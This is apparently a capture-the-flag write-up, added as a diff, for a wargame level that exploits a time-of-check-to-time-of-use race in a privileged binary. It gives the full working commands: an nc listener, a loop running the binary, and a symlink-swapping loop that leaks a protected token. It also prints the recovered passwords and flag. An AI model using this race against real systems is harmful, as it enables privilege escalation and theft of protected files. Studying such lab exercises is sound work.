@@ -1,0 +1,57 @@
+s5cAJpM8ev6XHw998pRWG728z
+
+Like before, two file, one executable "level10" and one token "token".
+level10 ask for a file to read and an address to communicate.
+
+<- objdump -d level10
+
+We can see the use off access function that check if it can read the file followed by a jump  to exit if he's not allowed.
+
+-> 8048749:       e8 92 fe ff ff          call   80485e0 <access@plt>
+
+If the token is readable, it open a connection:
+
+-> 804878f:       e8 5c fe ff ff          call   80485f0 <socket@plt>
+-> 80487cb:       e8 30 fe ff ff          call   8048600 <inet_addr@plt>
+-> 80487de:       e8 6d fd ff ff          call   8048550 <htons@plt>
+-> 8048805:       e8 06 fe ff ff          call   8048610 <connect@plt>
+
+And THEN open the file and read
+
+-> 804889b:       e8 00 fd ff ff          call   80485a0 <open@plt>
+-> 80488da:       e8 31 fc ff ff          call   8048510 <read@plt>
+
+This a call for a TOCTOU race (Time of Check to Time of Update).
+
+So we'll try to send both a readable file and our token as close as possible.
+
+A simple script that replace the file by a symbolic link while executing the file will do the work.
+Due to the fact that this is really fast, we'll do this in loop.
+
+We need first to listen (we'll use "nc") on wanted socket ("-l 6969" to listen on asked by the level10) and keep listen after each send ("-k"):
+
+<- nc -lk 6969 > /tmp/nyanpasu
+
+On two differend terminal, write these script:
+
+<- while (true) do ~/level10 /tmp/popipo 127.0.0.1 > /dev/null; done
+<- while (true) do touch /tmp/popipo; rm /tmp/popipo; ln -s ~/token /tmp/popipo; rm /tmp/popipo; done
+
+Now wait a bit.
+
+...
+A moment later
+...
+
+stop all the process, and let's check data stored (except ".*( )*.") in /tmp/nyanpasu.
+
+<- cat /tmp/nyanpasu | grep -v ".*( )*."
+-> woupa2yuojeeaaed06riuj63c
+
+Yeh !
+
+<- su flag10
+<- woupa2yuojeeaaed06riuj63c
+-> Don't forget to launch getflag !
+<- getflag
+-> Check flag.Here is your token : feulo4b72j7edeahuete3no7c
